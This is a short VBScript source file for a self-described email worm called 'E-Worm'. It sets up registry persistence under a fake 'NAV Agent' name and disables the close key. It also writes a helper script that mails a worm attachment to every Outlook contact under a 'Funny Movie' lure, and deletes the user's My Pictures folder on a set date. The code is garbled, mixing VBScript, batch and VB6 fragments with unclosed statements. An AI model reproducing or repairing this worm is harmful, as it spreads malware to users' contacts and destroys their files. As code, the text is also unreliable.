Rem "E-Worm"
Rem "Version VBS"
Rem "Ziimac"

Sub Main()

Rem Bug,VBassassin
Set WSHShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent", ""
Set WSHShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"
zm = Day(Date)
If zm = 18 Then
DeleteFile "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AIM",""
End If
Dim IE
Set IE = CreateObject("WScript.Shell")
IE.Run "C:\WINDOWS\system32\mspaint.exe"
IE.Run """C:\Program Files\Internet Explorer\IExplore.exe""

Sub Middle()
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\XXP", "c:\XP\xp.bat" > > c:\X.vbs
echo set B = CreateObject("Outlook.Application") > > c:\X.vbs
echo set C = b.GetNameSpace("MAPI") > > c:\X.vbs
echo for y = 1 To c.AddressLists.Count > > c:\X.vbs
echo set D = c.AddressLists(y) > > c:\X.vbs
echo X = 1 > > c:\X.vbs
echo set E = b.CreateItem(0) > > c:\X.vbs
echo for O = 1 To d.AddressEntries.Count > > c:\X.vbs
echo F = d.AddressEntries(x) > > c:\X.vbs
echo e.Recipients.Add F > > c:\X.vbs
echo X = X + 1 > > c:\X.vbs
echo next > > c:\X.vbs
echo e.Subject = "FWD: Funny Movie:)" > > c:\X.vbs
echo e.Body = "Click the attachment to see this funny movie. (JACKASS)" > > c:\X.vbs
echo e.Attachments.Add ("c:\WINDOWS\E-Worm.VB") > > c:\X.vbs
echo e.DeleteAfterSubmit = False > > c:\X.vbs
echo e.Send > > c:\X.vbs
echo F = "" > > c:\X.vbs
echo next > > c:\X.vbs
Rem VIRUS SPREAD!
Private Sub Form_Unload(Cancel As Integer)
Shell App.Path & "\" & App.EXEName & ".exe"
End Sub
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
STOP_SERVER Path
zo = Day(Date)
If zo = 1 Then
msgbox "First day of the month!
End If
zp = Day(Date)
If zp = 14 Then
DeleteFolder MyPictures
End If
zq = Day(Date)
If zq = 31 Then
Rem DELETE THIS VIRUS!!!!!!
End If
Cls
